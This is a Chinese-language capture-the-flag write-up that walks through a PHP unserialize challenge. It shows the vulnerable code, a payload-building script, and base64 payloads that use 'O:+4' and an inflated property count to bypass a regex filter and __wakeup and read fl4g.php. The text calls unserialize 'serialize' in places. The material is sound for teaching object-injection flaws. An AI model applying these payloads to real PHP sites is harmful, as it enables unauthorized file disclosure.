# Web_php_unserialize

难度系数: 2.0

我们需要在 index.php 代码中找到漏洞,从而拿到 flag:

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 

?>
```

分析一下, 当用 `GET` 方式传入 `var` 值, `var` 被进行 `base64_decode()`, 然后用 `preg_match` 检查如果匹配 `o/c:数字:` (o, c 不分大小写) 将返回 `stop hacking!`, 若不匹配, 进行 `serialize($var)`. 那么我们需要绕过 `preg_math`.

在 class `Demo` 里, 当一个新的定义 `Demo` 出现, `__construct` 就实现 `$this->file = $file`. 当结束, `__destruct` 显示 `$this->file` 的内容. 因为 flag 在 `fl4g.php` 里, 那么如果我们可以定义个新的 `Demo("fl4g.php")` 就可以读 `fl4g.php`. 但是, 当 `serialize($var)` 实现会使 `__wakeup` 实现, 如果 `$this->file` 不等于 `index.php` 就会把它换成 `index.php`. 所以我们要绕过 `__wakeup`.

脚本制造 payload:

```php
<?php
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
}
$var = new Demo("fl4g.php");
echo serialize($var);
?>
```

需要注意一点, 因为 `$file` 是 `private` 属性, 所以我们要改一点我们的 `payload` 通过以下定义:

`\x00 + 类名 + \x00 + 变量名` 反序列化出来的是 `private` 变量, `\x00 + * + \x00 + 变量名` 反序列化出来的是 `protected` 变量, 直接 `变量名` 反序列化出来的是 `public` 变量.

我用 `Burp Suite` 的 `Decoder` 进行修改显示 `Hex` 的 `\x00`, 绕过 `preg_match`:

`?var=O:+4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}`

绕过 `__wakeup` (在 `PHP5 < 5.6.25， PHP7 < 7.0.10` 的版本存在 `wakeup` 的漏洞): 

`?var=O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}`

然后进行 `base64_encode`, 得出最后 payload:

`?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==`
